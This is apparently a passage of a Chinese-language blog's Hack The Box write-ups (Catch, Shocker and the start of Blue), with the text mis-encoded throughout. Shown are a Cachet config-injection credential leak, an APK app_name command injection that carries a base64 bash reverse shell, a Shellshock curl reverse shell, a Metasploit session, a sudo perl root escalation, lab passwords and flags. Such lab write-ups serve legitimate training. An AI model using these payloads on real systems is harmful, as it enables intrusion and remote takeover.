= john password = E}V!mywu_69T4C}W è¿™é‡Œä»ä¸Šé¢çš„å†…å®¹ä¸­æå–åˆ°äº†ä¸€ç»„è´¦å·å¯†ç  æ‹¿åˆ° 8000 ç«¯å£å»ç™»é™†è¯•è¯• æˆåŠŸç™»é™†ï¼Œåˆ°å¤„çœ‹çœ‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª cachet çš„æœåŠ¡å™¨ï¼Œå»æœç´¢ä¸€ä¸‹æ¼æ´ æ‰¾åˆ°äº†ä¸€ç¯‡ Cachet 2.4ï¼šé€šè¿‡ Laravel é…ç½®æ³¨å…¥æ‰§è¡Œä»£ç  CVE-2021-39165 https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection æ ¹æ®æ–‡ç« æè¿°ï¼Œæ‹¦æˆª EMAIL çš„åŒ…ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸ºæ³¨å…¥è¯­å¥å°±è¡Œäº† ä¿®æ”¹ä¸º ${DB_USERNAME} ä¿®æ”¹ä¸º ${DB_PASSWORD} username = will passowrd = s2#4Fg0_%3! å¾—åˆ°äº†ä¸€ç»„è´¦å·å¯†ç ï¼Œå»ç™»é™† ssh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh will@10.10.11.150 will@10.10.11.150&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 06 Apr 2022 08:41:02 AM UTC System load: 0.19 Usage of /: 75.6% of 16.61GB Memory usage: 83% Swap usage: 33% Processes: 448 Users logged in: 0 IPv4 address for br-535b7cf3a728: 172.18.0.1 IPv4 address for br-fe1b5695b604: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.150 IPv6 address for eth0: dead:beef::250:56ff:feb9:ffd 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Apr 6 08:40:51 2022 from 10.10.14.9 will@catch:~$ whoami&amp;&amp;id will uid=1000(will) gid=1000(will) groups=1000(will) ç™»é™†æˆåŠŸ will@catch:~$ ls user.txt will@catch:~$ cat user.txt 24b48fcc5b166f68a855af04633081c7 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡will@catch:~$ sudo -l [sudo] password for will: Sorry, user will may not run sudo on catch. æŸ¥çœ‹ sudo -l å¤±è´¥ï¼Œé‚£çœ‹æ¥ä¸æ˜¯è¿™ä¸ªææƒæ€è·¯äº† å»è·‘äº†ä¸€ä¸‹ linpeas.sh [+] Readable files belonging to root and readable by me but not world readable -rwxr-x--x+ 1 root root 1894 Mar 3 14:23 /opt/mdm/verify.sh -rw-r----- 1 root will 33 Apr 5 17:23 /home/will/user.txt è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª &#x2F;opt&#x2F;mdm&#x2F;verify.sh æ–‡ä»¶ï¼Œå»è¿›ç¨‹æœä¸€ä¸‹ will@catch:~$ ps auxw|grep verify.sh will 386873 0.0 0.0 6436 656 pts/0 S+ 08:59 0:00 grep --color=auto verify.sh ä¹Ÿæœ‰è¿è¡Œè®°å½•ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ will@catch:~$ cat /opt/mdm/verify.sh #!/bin/bash ################### # Signature Check # ################### sig_check() { jarsigner -verify &quot;$1/$2&quot; 2&gt;/dev/null &gt;/dev/null if [[ $? -eq 0 ]]; then echo &#39;[+] Signature Check Passed&#39; else echo &#39;[!] Signature Check Failed. Invalid Certificate.&#39; cleanup exit fi } ####################### # Compatibility Check # ####################### comp_check() { apktool d -s &quot;$1/$2&quot; -o $3 2&gt;/dev/null &gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 &quot;(?&lt;=compileSdkVersion=\\&quot;)[^\\&quot;]+&quot; &quot;$PROCESS_BIN/AndroidManifest.xml&quot;) if [ -z &quot;$COMPILE_SDK_VER&quot; ]; then echo &#39;[!] Failed to find target SDK version.&#39; cleanup exit else if [ $COMPILE_SDK_VER -lt 18 ]; then echo &quot;[!] APK Doesn&#39;t meet the requirements&quot; cleanup exit fi fi } #################### # Basic App Checks # #################### app_check() { APP_NAME=$(grep -oPm1 &quot;(?&lt;=&lt;string name=\\&quot;app_name\\&quot;&gt;)[^&lt;]+&quot; &quot;$1/res/values/strings.xml&quot;) echo $APP_NAME if [[ $APP_NAME == *&quot;Catch&quot;* ]]; then echo -n $APP_NAME|xargs -I {} sh -c &#39;mkdir {}&#39; mv &quot;$3/$APK_NAME&quot; &quot;$2/$APP_NAME/$4&quot; else echo &quot;[!] App doesn&#39;t belong to Catch Global&quot; cleanup exit fi } ########### # Cleanup # ########### cleanup() { rm -rf $PROCESS_BIN;rm -rf &quot;$DROPBOX/*&quot; &quot;$IN_FOLDER/*&quot;;rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh) } ################### # MDM CheckerV1.0 # ################### DROPBOX=/opt/mdm/apk_bin IN_FOLDER=/root/mdm/apk_bin OUT_FOLDER=/root/mdm/certified_apps PROCESS_BIN=/root/mdm/process_bin for IN_APK_NAME in $DROPBOX/*.apk;do OUT_APK_NAME=&quot;$(echo ${IN_APK_NAME##*/} | cut -d &#39;.&#39; -f1)_verified.apk&quot; APK_NAME=&quot;$(openssl rand -hex 12).apk&quot; if [[ -L &quot;$IN_APK_NAME&quot; ]]; then exit else mv &quot;$IN_APK_NAME&quot; &quot;$IN_FOLDER/$APK_NAME&quot; fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME done cleanup è¿™é‡Œçš„ app_check() å‡½æ•°æœ‰é—®é¢˜ å®ƒåœ¨ &#x2F;res&#x2F;values&#x2F;strings.xml çš„ APK ä¸­æœç´¢ APP_NAME æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸‹ åšä¸€ä¸ªå‘½ä»¤æ³¨å…¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1&#39;|base64 L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==|base64 -d /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1 ç„¶åç¼–å†™ä¸€ä¸‹ payload &lt;string name=&quot;app_name&quot;&gt;Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== | base64 -d | bash&lt;/string&gt; ç„¶åä½¿ç”¨ä¸Šé¢çš„ payload æ›¿æ¢ &#x2F;res&#x2F;values&#x2F;strings.xml çš„ç¬¬ 30 è¡Œ app_name è¿™ä¸€è¡Œ æ¥ç€ä½¿ç”¨ nc -nvlp ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åå»ä½¿ç”¨ github ä¸Šæœ€æ–°ç‰ˆæœ¬ 2.6.1 çš„ apktool æ¥æ‰“åŒ…æ„é€ æ–°çš„ app â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# java -jar apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk 1 â¨¯ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.6.1 I: Smaling smali folder into classes.dex... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk... â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# ls apktool_2.6.1.jar catchv1.0 catchv1.0.apk catchv2.0.apk ç„¶åå»ç»™ apk ç­¾åï¼Œå¹¶ä¸”éªŒè¯ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_name jarsigner -verify -verbose -certs catchv2.0.apk â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true è¾“å…¥å¯†é’¥åº“å£ä»¤: å†æ¬¡è¾“å…¥æ–°å£ä»¤: æ‚¨çš„åå­—ä¸å§“æ°æ˜¯ä»€ä¹ˆ? [Unknown]: æ‚¨çš„ç»„ç»‡å•ä½åç§°æ˜¯ä»€ä¹ˆ? [Unknown]: æ‚¨çš„ç»„ç»‡åç§°æ˜¯ä»€ä¹ˆ? [Unknown]: æ‚¨æ‰€åœ¨çš„åŸå¸‚æˆ–åŒºåŸŸåç§°æ˜¯ä»€ä¹ˆ? [Unknown]: æ‚¨æ‰€åœ¨çš„çœ/å¸‚/è‡ªæ²»åŒºåç§°æ˜¯ä»€ä¹ˆ? [Unknown]: è¯¥å•ä½çš„åŒå­—æ¯å›½å®¶/åœ°åŒºä»£ç æ˜¯ä»€ä¹ˆ? [Unknown]: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknownæ˜¯å¦æ­£ç¡®? [å¦]: y æ­£åœ¨ä¸ºä»¥ä¸‹å¯¹è±¡ç”Ÿæˆ 2,048 ä½RSAå¯†é’¥å¯¹å’Œè‡ªç­¾åè¯ä¹¦ (SHA256withRSA) (æœ‰æ•ˆæœŸä¸º 10,000 å¤©): CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [æ­£åœ¨å­˜å‚¨my-release-key.keystore] â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# ls my-release-key.keystore my-release-key.keystore ç”Ÿæˆäº†ä¸€ä¸ªç­¾åæ–‡ä»¶ï¼Œç„¶åéªŒè¯å†…å®¹è¾ƒå¤šï¼Œå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œå¤§å®¶è‡ªè¡ŒéªŒè¯å³å¯ ä½¿ç”¨ python3 -m å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ç„¶åä½¿ç”¨ wget ä¸‹è½½è¿™ä¸ª apk will@catch:~$ wget http://10.10.14.9/catchv2.0.apk --2022-04-06 09:28:38-- http://10.10.14.9/catchv2.0.apk Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2821343 (2.7M) [application/vnd.android.package-archive] Saving to: â€˜catchv2.0.apkâ€™ catchv2.0.apk 100%[=================================================================&gt;] 2.69M 869KB/s in 3.2s 2022-04-06 09:28:42 (869 KB/s) - â€˜catchv2.0.apkâ€™ saved [2821343/2821343] ç„¶åå°†ä¸‹è½½çš„ apk æ”¾å…¥ /opt/mdm/apk_bin æ–‡ä»¶å¤¹ will@catch:~$ cp catchv2.0.apk /opt/mdm/apk_bin will@catch:~$ ls /opt/mdm/apk_bin catchv2.0.apk â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.11.150] 34410 bash: cannot set terminal process group (397832): Inappropriate ioctl for device bash: no job control in this shell root@catch:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) ç„¶åç­‰å¾…ä¸€ä¼šå„¿ï¼Œæˆ‘ä»¬å°±ä¼šè·å¾—ä¸€ä¸ª root æƒé™çš„ shell root@catch:~# cd /root cd /root root@catch:~# cat root.txt cat root.txt 36160af074e848d9139b7d14c9c4e5ca æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Shocker - Hackthebox","slug":"Hackthebox - Shocker","date":"2022-04-04T11:38:36.000Z","updated":"2023-05-20T03:09:33.000Z","comments":true,"path":"2022/04/04/Hackthebox - Shocker/","link":"","permalink":"http://www.lucifiel.com/2022/04/04/Hackthebox%20-%20Shocker/","excerpt":"","text":"Hackthebox - Shockeré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Shocker] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-01 22:29 EDT Nmap scan report for 10.10.10.56 Host is up (0.25s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/1%OT=80%CT=1%CU=41565%PV=Y%DS=2%DC=T%G=Y%TM=6247B561 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ( OS:SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=B)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%T OS:S=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5= OS:M505ST11NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7 OS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0% OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S= OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R= OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N% OS:T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 61716/tcp) HOP RTT ADDRESS 1 246.66 ms 10.10.14.1 2 246.79 ms 10.10.10.56 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.63 seconds Http è¿™é‡Œä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz ä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.10.56/FUZZ&quot; -w /usr/share/dirb/wordlists/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.56/FUZZ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 200, Size: 137, Words: 9, Lines: 10] .hta [Status: 403, Size: 290, Words: 22, Lines: 12] .htaccess [Status: 403, Size: 295, Words: 22, Lines: 12] .htpasswd [Status: 403, Size: 295, Words: 22, Lines: 12] cgi-bin/ [Status: 403, Size: 294, Words: 22, Lines: 12] index.html [Status: 200, Size: 137, Words: 9, Lines: 10] server-status [Status: 403, Size: 299, Words: 22, Lines: 12] :: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:01:00] :: Errors: 0 :: çœ‹åˆ°æœ‰ä¸€ä¸ª cgi-bin ç›®å½•ï¼Œç»§ç»­ fuzz â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.10.56/cgi-bin/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .sh,.pl /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.56/cgi-bin/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Extensions : .sh .pl :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ user.sh [Status: 200, Size: 118, Words: 19, Lines: 8] [Status: 403, Size: 294, Words: 22, Lines: 12] :: Progress: [60348/60348] :: Job [1/1] :: 152 req/sec :: Duration: [0:15:14] :: Errors: 19 :: å‘ç°ä¸€ä¸ª user.sh æ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ æœ‰ç‚¹ä¸å¤ªæ˜ç™½è¿™æ˜¯å•¥ï¼Œå» google ä¸€ä¸‹å§ https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock æ‰¾åˆ°ä¸€ç¯‡æ–‡ç«  æ¼æ´åˆ©ç”¨Shellshockæ ¹æ®æ–‡ç« å†…å®¹ï¼Œå°è¯•ä¸€ä¸‹åå¼¹ shell ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åå»åˆ©ç”¨ curl -i -H &quot;User-agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1&quot; http://10.10.10.56/cgi-bin/user.sh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 1 â¨¯ listening on [any] 4444 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 40320 bash: no job control in this shell shelly@Shocker:/usr/lib/cgi-bin$ whoami&amp;&amp;id whoami&amp;&amp;id shelly uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) shelly@Shocker:/usr/lib/cgi-bin$ æˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ shell exploit-db https://www.exploit-db.com/exploits/34900 æˆ‘è¿™è¾¹åˆ©ç”¨æœ‰ç‚¹é—®é¢˜ï¼Œå°±ä¸æµ‹è¯•äº† Metasploituse exploit/multi/http/apache_mod_cgi_bash_env_exec msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.56 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /cgi-bin/user.sh yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 è®¾ç½®å¥½ç›¸å…³çš„é…ç½®åï¼Œæ‰§è¡Œ msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.14.4:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (984904 bytes) to 10.10.10.56 [*] Meterpreter session 2 opened (10.10.14.4:4444 -&gt; 10.10.10.56:40322) at 2022-04-02 00:56:02 -0400 meterpreter &gt; getuid Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000) è¿™é‡Œä¹ŸæˆåŠŸå›å¼¹ ä¿®å¤ shellpython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Zè¿”å› stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 shelly@Shocker:/home/shelly$ cat user.txt 2ec24e11320026d1e70ff3e16695b233 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡shelly@Shocker:/home/shelly$ sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl ä½¿ç”¨ sudo -l æŸ¥çœ‹å¾—çŸ¥æœ‰æƒé™ä½¿ç”¨ sudo è¿è¡Œ &#x2F;usr&#x2F;bin&#x2F;perl https://gtfobins.github.io/gtfobins/perl/ perl å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•ææƒï¼Œå°è¯•ä¸€ä¸‹ sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39; shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39; # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ # cat root.txt 52c2715605d70c7619030560dc1ca467 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Blue - Hackthebox","slug":"Hackthebox - Blue","date":"2022-04-03T11:38:36.000Z","updated":"2023-05-20T01:24:00.000Z","comments":true,"path":"2022/04/03/Hackthebox - Blue/","link":"","permalink":"http://www.lucifiel.com/2022/04/03/Hackthebox%20-%20Blue/","excerpt":"","text":"Hackthebox - Blueé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Blue] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:22 EDT Nmap scan report for 10.10.10.40 Host is up (0.57s latency). Not shown: 60896 filtered ports, 4636 closed ports PORT STATE SERVICE VERSION 135/tcp open tcpwrapped 139/tcp open tcpwrapped 445/tcp open tcpwrapped Windows 7 Professional 7601 Service Pack 1 tcpwrapped No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=3/30%OT=445%CT=21%CU=36006%PV=Y%DS=2%DC=T%G=Y%TM=6243D OS:C0A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II OS:=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW OS:8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5= OS:2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=N%Q=)T1(R= OS:N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%DF=Y%T=80%W=0%S=Z OS:%A=S%F=AR%O=%RD=0%Q=)T3(R=N)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q= OS:)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R OS:%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N) OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)I OS:E(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Host script results: |_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-03-30T05:26:31+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2022-03-30T04:26:34 |_ start_date: 2022-03-30T04:03:04 TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 552.18 ms 10.10.16.1 2 255.14 ms 10.10.10.40 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 238.83 seconds è¿™å°å¾ˆæ˜æ˜¾äº†ï¼Œè€Œä¸”ç›¸ä¿¡å¤§å®¶çœ‹åå­—å°±å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œç›´æ¥åˆ©ç”¨å§ æ°¸æ’ä¹‹è“Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap --script=vuln 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:29 EDT Nmap scan report for 10.10.10.40 Host is up (0.54s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 173.70 seconds ç¡®è®¤å­˜åœ¨ Metasploituse auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES 